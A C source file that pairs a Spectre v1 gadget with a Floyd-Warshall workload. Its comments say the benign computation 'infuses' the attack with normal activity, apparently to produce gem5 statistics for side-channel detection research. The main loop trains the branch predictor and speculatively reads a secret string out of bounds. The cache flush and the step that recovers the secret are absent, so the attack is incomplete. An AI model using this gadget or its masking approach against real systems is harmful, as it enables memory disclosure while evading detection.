#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ==========================================
// PART 1: SPECTRE V1 GADGET
// ==========================================
unsigned int array1_size = 16;
uint8_t unused1[64]; // Padding to prevent cache hits from adjacent memory
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64]; // Padding
uint8_t array2[256 * 512];

char *secret = "DefaultSecret"; // This pointer will be changed by argv[1]
uint8_t temp = 0;

// The "Gadget" - The vulnerable function
void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}

#define V 5
#define INF 99999

void run_floyd_workload() {
    int graph[V][V] = {{0, 5, INF, 10, INF},
                       {INF, 0, 3, INF, INF},
                       {INF, INF, 0, 1, INF},
                       {INF, INF, INF, 0, 2},
                       {INF, INF, INF, INF, 0}};

    int dist[V][V];
    // Initialize
    for (int i = 0; i < V; i++)
        for (int j = 0; j < V; j++)
            dist[i][j] = graph[i][j];

    // Core Algorithm
    for (int k = 0; k < V; k++) {
        for (int i = 0; i < V; i++) {
            for (int j = 0; j < V; j++) {
                if (dist[i][k] + dist[k][j] < dist[i][j])
                    dist[i][j] = dist[i][k] + dist[k][j];
            }
        }
    }
    volatile int x = dist[0][4];
    (void)x;
}

// ==========================================
// PART 3: MAIN (INFUSION)
// ==========================================
int main(int argc, char **argv) {
    // 1. Setup the Secret
    if (argc > 1) {
        secret = argv[1];
    }
    size_t secret_len = strlen(secret);

    // Calculate where the secret is relative to array1
    // (Spectre exploits this offset to read out-of-bounds)
    size_t malicious_x = (size_t)(secret - (char *)array1);

    printf("Starting Floyd + Spectre V1 Infusion...\n");
    printf("Target Secret: %s\n", secret);
    printf("Offset: %ld\n", malicious_x);

    // Initialize array2 to ensure it is in memory
    for (int i = 0; i < sizeof(array2); i++) {
        array2[i] = 1;
    }

    // 2. The Attack Loop (Scanning the secret byte by byte)
    for (int i = 0; i < secret_len; i++) {

        // --- A. BENIGN NOISE ---
        // Run the benign workload to "infuse" the malicious behavior with
        // normal activity
        run_floyd_workload();

        // --- B. SPECTRE ATTACK SEQUENCE ---

        // Step 1: Flush array2 from cache (Simulated here conceptually)
        // In a real attack, you would use `_mm_clflush` or an eviction set.
        // For gem5 simulation, the access pattern itself generates the stats we
        // need.

        // Step 2: Train the Branch Predictor
        // We call the victim function with valid inputs (0..15) multiple times
        // to train the CPU to expect "True" for the (x < array1_size) check.
        for (int train = 0; train < 10; train++) {
            victim_function(train % array1_size);
        }

        // Step 3: The Exploit
        // We call it with the malicious offset. The CPU predicts "True" and
        // speculatively accesses array2[secret_byte * 512].
        // Even though it eventually realizes x is too big and reverts,
        // the cache line for that secret byte is now loaded.
        victim_function(malicious_x + i);
    }

    // Prevent compiler from optimizing out the results
    printf("Used temp: %d\n", temp);
    printf("Done.\n");
    return 0;
}
